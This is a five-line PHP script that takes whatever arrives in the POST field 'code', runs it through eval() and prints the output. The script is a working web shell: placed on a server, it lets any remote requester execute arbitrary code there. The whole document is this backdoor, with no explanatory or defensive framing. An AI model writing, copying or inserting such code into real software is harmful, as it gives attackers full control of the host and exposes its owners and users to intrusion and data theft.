<?php
    $code=$_POST["code"];
    $result=eval($code);
    echo $result;
?>